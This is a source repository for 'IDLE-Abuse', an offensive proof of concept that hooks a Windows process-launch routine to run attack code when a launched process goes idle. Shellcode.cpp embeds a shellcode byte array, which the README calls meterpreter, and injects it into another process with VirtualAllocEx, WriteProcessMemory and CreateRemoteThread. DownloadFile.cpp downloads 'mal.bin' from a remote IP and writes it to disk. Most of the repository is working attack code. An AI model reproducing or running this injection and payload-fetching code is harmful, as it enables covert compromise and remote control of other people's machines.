Project Path: arc_gmh5225_IDLE-Abuse_jmyy85uc

Source Tree:

```txt
arc_gmh5225_IDLE-Abuse_jmyy85uc
├── README.md
├── RegisterWaitForInputIdle
│   ├── DownloadFile.cpp
│   ├── MessageBox.cpp
│   ├── RegisterWaitForInputIdle.sln
│   ├── RegisterWaitForInputIdle.vcxproj
│   ├── RegisterWaitForInputIdle.vcxproj.filters
│   ├── RegisterWaitForInputIdle.vcxproj.user
│   ├── Shellcode.cpp
│   └── readme.md
└── random-cat.gif

```

`README.md`:

```md
# IDLE-Abuse

<img title="cat-is-cute" alt="Alt text" src="https://github.com/RixedLabs/IDLE-Abuse/blob/main/random-cat.gif">

IDLE Abuse :A simple technique to detect when a Windows process becomes idle and inject malicious code into it. This technique relies on an undocumented Windows API function called RegisterWaitForInputIdle, which allows a callback function to be registered and called when a process becomes idle.

The PoC, written by [Navneet Raj](https://twitter.com/_muffin31) and [ElementalX](https://twitter.com/ElementalX2) , demonstrates the use of this technique by registering a callback function that injects a meterpreter shellcode into the Windows calculator process when the process spawned by `WinExec` function becomes idle. Thanks to folks at Stack Overflow & REACT OS Source code for showing us the correct direction. 


Special thanks to [modexp](https://twitter.com/modexpblog) for helping us with the code overview. 

```

`RegisterWaitForInputIdle/DownloadFile.cpp`:

```cpp
//Author : Navneet & ElementalX

#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <fstream>
#include <winternl.h>
#include <TlHelp32.h>


#pragma comment(lib, "wininet.lib")


DWORD MyWaitForInputIdleRoutine(HANDLE hProcess, DWORD dwMilliseconds)
{

    HINTERNET hInternet = InternetOpen(L"MyApp", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet)
    {
        std::cout << "Failed to initialize WinINet session\n";
        return 1;
    }


    HINTERNET hConnect = InternetConnect(hInternet, L"192.xxx.xx.x", 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect)
    {
        std::cout << "Failed to connect to remote host\n";
        InternetCloseHandle(hInternet);
        return 1;
    }

    HINTERNET hRequest = HttpOpenRequest(hConnect, L"GET", L"/mal.bin", NULL, NULL, NULL, 0, 0);
    if (!hRequest)
    {
        std::cout << "Failed to open HTTP request\n";
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }


    BOOL bSendRequest = HttpSendRequest(hRequest, NULL, 0, NULL, 0);
    if (!bSendRequest)
    {
        std::cout << "Failed to send HTTP request\n";
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }


    std::ofstream outfile("C:\\Users\\Downloads\\mal.bin", std::ios::out | std::ios::binary);
    if (!outfile.is_open())
    {
        std::cout << "Failed to create output file\n";
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }


    char buffer[1024];
    DWORD dwRead = 0;
    while (InternetReadFile(hRequest, buffer, sizeof(buffer), &dwRead) && dwRead != 0)
    {
        outfile.write(buffer, dwRead);
    }


    outfile.close();


    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return 0;
}


typedef DWORD(WINAPI* WaitForInputIdleType)(HANDLE, DWORD);


WaitForInputIdleType UserWaitForInputIdleRoutine = NULL;


VOID WINAPI RegisterWaitForInputIdle(WaitForInputIdleType lpfnRegisterWaitForInputIdle)
{
    UserWaitForInputIdleRoutine = lpfnRegisterWaitForInputIdle;
}


UINT WINAPI MyWinExec(LPCSTR lpCmdLine, UINT uCmdShow)
{
    STARTUPINFOA StartupInfo;
    PROCESS_INFORMATION ProcessInformation;
    DWORD dosErr;

    RtlZeroMemory(&StartupInfo, sizeof(StartupInfo));
    StartupInfo.cb = sizeof(STARTUPINFOA);
    StartupInfo.wShowWindow = (WORD)uCmdShow;
    StartupInfo.dwFlags = 0;

    if (!CreateProcessA(NULL,
        (LPSTR)lpCmdLine,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &StartupInfo,
        &ProcessInformation))
    {
        dosErr = GetLastError();
        return dosErr < 32 ? dosErr : ERROR_BAD_FORMAT;
    }

    if (NULL != UserWaitForInputIdleRoutine)
    {

        UserWaitForInputIdleRoutine(ProcessInformation.hProcess, 10000);
    }

    CloseHandle(ProcessInformation.hProcess);
    CloseHandle(ProcessInformation.hThread);

    return 33;
}

int main()
{

    RegisterWaitForInputIdle(MyWaitForInputIdleRoutine);


    UINT result = MyWinExec("C:\\Windows\\System32\\calc.exe", SW_SHOWNORMAL);

    std::cout << "WinExec returned: " << result << std::endl;

    return 0;
}
```

`RegisterWaitForInputIdle/MessageBox.cpp`:

```cpp
//Author : Navneet & ElementalX

#include <windows.h>
#include <iostream>
#include <winternl.h>
#include <TlHelp32.h>



DWORD MyWaitForInputIdleRoutine(HANDLE hProcess, DWORD dwMilliseconds)
{

    MessageBoxA(NULL, "Hello World", "POP POP", MB_OK);
}


typedef DWORD(WINAPI* WaitForInputIdleType)(HANDLE, DWORD);


WaitForInputIdleType UserWaitForInputIdleRoutine = NULL;


VOID WINAPI RegisterWaitForInputIdle(WaitForInputIdleType lpfnRegisterWaitForInputIdle)
{
    UserWaitForInputIdleRoutine = lpfnRegisterWaitForInputIdle;
}


UINT WINAPI MyWinExec(LPCSTR lpCmdLine, UINT uCmdShow)
{
    STARTUPINFOA StartupInfo;
    PROCESS_INFORMATION ProcessInformation;
    DWORD dosErr;

    RtlZeroMemory(&StartupInfo, sizeof(StartupInfo));
    StartupInfo.cb = sizeof(STARTUPINFOA);
    StartupInfo.wShowWindow = (WORD)uCmdShow;
    StartupInfo.dwFlags = 0;

    if (!CreateProcessA(NULL,
        (LPSTR)lpCmdLine,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &StartupInfo,
        &ProcessInformation))
    {
        dosErr = GetLastError();
        return dosErr < 32 ? dosErr : ERROR_BAD_FORMAT;
    }

    if (NULL != UserWaitForInputIdleRoutine)
    {

        UserWaitForInputIdleRoutine(ProcessInformation.hProcess, 10000);
    }

    CloseHandle(ProcessInformation.hProcess);
    CloseHandle(ProcessInformation.hThread);

    return 33;
}

int main()
{

    RegisterWaitForInputIdle(MyWaitForInputIdleRoutine);


    UINT result = MyWinExec("C:\\Windows\\System32\\calc.exe", SW_SHOWNORMAL);

    std::cout << "WinExec returned: " << result << std::endl;

    return 0;
}
```

`RegisterWaitForInputIdle/RegisterWaitForInputIdle.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.6.33513.286
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "RegisterWaitForInputIdle", "RegisterWaitForInputIdle.vcxproj", "{EA5B3179-939D-4437-A4B5-1080BEEB2FA5}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{EA5B3179-939D-4437-A4B5-1080BEEB2FA5}.Debug|x64.ActiveCfg = Debug|x64
		{EA5B3179-939D-4437-A4B5-1080BEEB2FA5}.Debug|x64.Build.0 = Debug|x64
		{EA5B3179-939D-4437-A4B5-1080BEEB2FA5}.Debug|x86.ActiveCfg = Debug|Win32
		{EA5B3179-939D-4437-A4B5-1080BEEB2FA5}.Debug|x86.Build.0 = Debug|Win32
		{EA5B3179-939D-4437-A4B5-1080BEEB2FA5}.Release|x64.ActiveCfg = Release|x64
		{EA5B3179-939D-4437-A4B5-1080BEEB2FA5}.Release|x64.Build.0 = Release|x64
		{EA5B3179-939D-4437-A4B5-1080BEEB2FA5}.Release|x86.ActiveCfg = Release|Win32
		{EA5B3179-939D-4437-A4B5-1080BEEB2FA5}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {34E0D929-D73F-4FAD-A99D-35C3B032F6D8}
	EndGlobalSection
EndGlobal

```

`RegisterWaitForInputIdle/RegisterWaitForInputIdle.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="DownloadFile.cpp" />
    <ClCompile Include="MessageBox.cpp" />
    <ClCompile Include="Shellcode.cpp" />
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{ea5b3179-939d-4437-a4b5-1080beeb2fa5}</ProjectGuid>
    <RootNamespace>RegisterWaitForInputIdle</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`RegisterWaitForInputIdle/RegisterWaitForInputIdle.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="DownloadFile.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="MessageBox.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Shellcode.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`RegisterWaitForInputIdle/RegisterWaitForInputIdle.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`RegisterWaitForInputIdle/Shellcode.cpp`:

```cpp
//Author : Navneet & ElementalX

#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <TlHelp32.h>


unsigned char shellcode[] =
"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\x0d\xb5\x4c\xe3\x8c\xeb\x24\xb7\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xf1\xfd\xcf"
"\x07\x7c\x03\xe4\xb7\x0d\xb5\x0d\xb2\xcd\xbb\x76\xe6\x5b"
"\xfd\x7d\x31\xe9\xa3\xaf\xe5\x6d\xfd\xc7\xb1\x94\xa3\xaf"
"\xe5\x2d\xfd\xc7\x91\xdc\xa3\x2b\x00\x47\xff\x01\xd2\x45"
"\xa3\x15\x77\xa1\x89\x2d\x9f\x8e\xc7\x04\xf6\xcc\x7c\x41"
"\xa2\x8d\x2a\xc6\x5a\x5f\xf4\x1d\xab\x07\xb9\x04\x3c\x4f"
"\x89\x04\xe2\x5c\x60\xa4\x3f\x0d\xb5\x4c\xab\x09\x2b\x50"
"\xd0\x45\xb4\x9c\xb3\x07\xa3\x3c\xf3\x86\xf5\x6c\xaa\x8d"
"\x3b\xc7\xe1\x45\x4a\x85\xa2\x07\xdf\xac\xff\x0c\x63\x01"
"\xd2\x45\xa3\x15\x77\xa1\xf4\x8d\x2a\x81\xaa\x25\x76\x35"
"\x55\x39\x12\xc0\xe8\x68\x93\x05\xf0\x75\x32\xf9\x33\x7c"
"\xf3\x86\xf5\x68\xaa\x8d\x3b\x42\xf6\x86\xb9\x04\xa7\x07"
"\xab\x38\xfe\x0c\x65\x0d\x68\x88\x63\x6c\xb6\xdd\xf4\x14"
"\xa2\xd4\xb5\x7d\xed\x4c\xed\x0d\xba\xcd\xb1\x6c\x34\xe1"
"\x95\x0d\xb1\x73\x0b\x7c\xf6\x54\xef\x04\x68\x9e\x02\x73"
"\x48\xf2\x4a\x11\xaa\x32\x9c\x57\x85\x52\x86\x7e\xe3\x8c"
"\xaa\x72\xfe\x84\x53\x04\x62\x60\x4b\x25\xb7\x0d\xfc\xc5"
"\x06\xc5\x57\x26\xb7\x0c\x0e\x8c\x4b\x8d\xec\x65\xe3\x44"
"\x3c\xa8\xaf\x05\x1a\x65\x0d\x41\xc2\x6a\xe4\x73\x3e\x68"
"\x3e\xe7\xdd\x4d\xe2\x8c\xeb\x7d\xf6\xb7\x9c\xcc\x88\x8c"
"\x14\xf1\xe7\x5d\xf8\x7d\x2a\xc1\xda\xe4\xff\xf2\x75\x04"
"\x6a\x4e\xa3\xdb\x77\x45\x3c\x8d\xa2\x36\x01\x2b\x68\xed"
"\x4a\x99\xab\x05\x2c\x4e\xa7\x4c\xed\x00\x6a\x6e\xa3\xad"
"\x4e\x4c\x0f\xd5\x46\xf8\x8a\xdb\x62\x45\x34\x88\xa3\x8e"
"\xeb\x24\xfe\xb5\xd6\x21\x87\x8c\xeb\x24\xb7\x0d\xf4\x1c"
"\xa2\xdc\xa3\xad\x55\x5a\xe2\x1b\xae\xbd\x2b\x4e\xba\x54"
"\xf4\x1c\x01\x70\x8d\xe3\xf3\x29\xe1\x4d\xe2\xc4\x66\x60"
"\x93\x15\x73\x4c\x8b\xc4\x62\xc2\xe1\x5d\xf4\x1c\xa2\xdc"
"\xaa\x74\xfe\xf2\x75\x0d\xb3\xc5\x14\xec\xfa\x84\x74\x00"
"\x6a\x4d\xaa\x9e\xce\xc1\x8a\xca\x1c\x59\xa3\x15\x65\x45"
"\x4a\x86\x68\x82\xaa\x9e\xbf\x8a\xa8\x2c\x1c\x59\x50\xd4"
"\x02\xaf\xe3\x0d\x59\x2a\x7e\x99\x2a\xf2\x60\x04\x60\x48"
"\xc3\x18\xb1\x71\xbf\xcc\x18\x6c\x9e\x21\x0c\x4a\xa6\x3e"
"\x8c\xe6\xeb\x7d\xf6\x84\x6f\xb3\x36\x8c\xeb\x24\xb7";





DWORD MyWaitForInputIdleRoutine(HANDLE hProcess, DWORD dwMilliseconds)
{

    HANDLE _OpenProcess{};
    HANDLE _CreateRemoteThread{};
    PVOID threadrourtineshellcoderun;
    DWORD processID = 18532;
    PROCESSENTRY32 pe{};
    ZeroMemory(&pe, sizeof(pe));
    pe.dwSize = sizeof(PROCESSENTRY32);


    _OpenProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, processID);

    LPVOID lpRemoteAddress = VirtualAllocEx(_OpenProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpRemoteAddress == NULL)
    {
        std::cerr << "Failed to allocate memory in remote process" << std::endl;
        return GetLastError();
    }


    if (!WriteProcessMemory(_OpenProcess, lpRemoteAddress, shellcode, sizeof(shellcode), NULL))
    {
        std::cerr << "Failed to write shellcode to remote process memory" << std::endl;
        VirtualFreeEx(hProcess, lpRemoteAddress, 0, MEM_RELEASE);
        return GetLastError();
    }




    HANDLE hRemoteThread = CreateRemoteThread(_OpenProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteAddress, NULL, 0, NULL);
    if (hRemoteThread == NULL)
    {
        std::cerr << "Failed to create remote thread" << std::endl;
        VirtualFreeEx(hProcess, lpRemoteAddress, 0, MEM_RELEASE);
        return GetLastError();
    }

    if (hRemoteThread) {

        MessageBoxA(NULL, "Shellcode injected using RegisterWaitForInputIdle", "ACHIVED", MB_OK);
    }


    WaitForSingleObject(hRemoteThread, INFINITE);


    VirtualFreeEx(hProcess, lpRemoteAddress, 0, MEM_RELEASE);
    CloseHandle(hRemoteThread);

    return 0;
}


typedef DWORD(WINAPI* WaitForInputIdleType)(HANDLE, DWORD);


WaitForInputIdleType UserWaitForInputIdleRoutine = NULL;


VOID WINAPI RegisterWaitForInputIdle(WaitForInputIdleType lpfnRegisterWaitForInputIdle)
{
    UserWaitForInputIdleRoutine = lpfnRegisterWaitForInputIdle;
}


UINT WINAPI MyWinExec(LPCSTR lpCmdLine, UINT uCmdShow)
{
    STARTUPINFOA StartupInfo;
    PROCESS_INFORMATION ProcessInformation;
    DWORD dosErr;

    RtlZeroMemory(&StartupInfo, sizeof(StartupInfo));
    StartupInfo.cb = sizeof(STARTUPINFOA);
    StartupInfo.wShowWindow = (WORD)uCmdShow;
    StartupInfo.dwFlags = 0;

    if (!CreateProcessA(NULL,
        (LPSTR)lpCmdLine,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &StartupInfo,
        &ProcessInformation))
    {
        dosErr = GetLastError();
        return dosErr < 32 ? dosErr : ERROR_BAD_FORMAT;
    }

    if (NULL != UserWaitForInputIdleRoutine)
    {

        UserWaitForInputIdleRoutine(ProcessInformation.hProcess, 10000);
    }

    CloseHandle(ProcessInformation.hProcess);
    CloseHandle(ProcessInformation.hThread);

    return 33;
}

int main()
{

    RegisterWaitForInputIdle(MyWaitForInputIdleRoutine);


    UINT result = MyWinExec("C:\\Windows\\System32\\calc.exe", SW_SHOWNORMAL);

    std::cout << "WinExec returned: " << result << std::endl;

    return 0;
}
```